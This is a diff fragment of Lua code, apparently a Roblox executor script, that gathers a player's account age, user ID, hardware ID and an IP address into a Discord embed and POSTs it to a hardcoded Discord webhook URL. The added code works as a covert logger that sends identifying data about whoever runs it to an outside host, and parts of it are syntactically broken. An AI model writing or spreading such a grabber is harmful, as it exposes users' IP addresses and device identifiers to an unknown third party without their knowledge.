+            ["fields"] = {
+                {
+                    ["name"] = "__Account Age:__",
+                    ["value"] = plr.AccountAge.." days old",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "__User ID:__",
+                    ["value"] = plr.UserId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "__HWID:__",
+                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId()},
+                    ["inline"] = true
+                }
+            },
+            {
+            ["footer"] = {
+                ["text"] = "IP Address: "..tostring(ident),
+                ["icon_url"] = ""
+            },
+            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discord.com/api/webhooks/1076232694075228212/77dXHIjyZoQdDZLDjOT8z4NM0mAKMStRSL9lt_O2Ue0Ox1r6ri3C_xjF8TI2QK2hO3P1';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService('HttpService'):JSONEncode({content = Content; embeds = {Embed}; });
+};
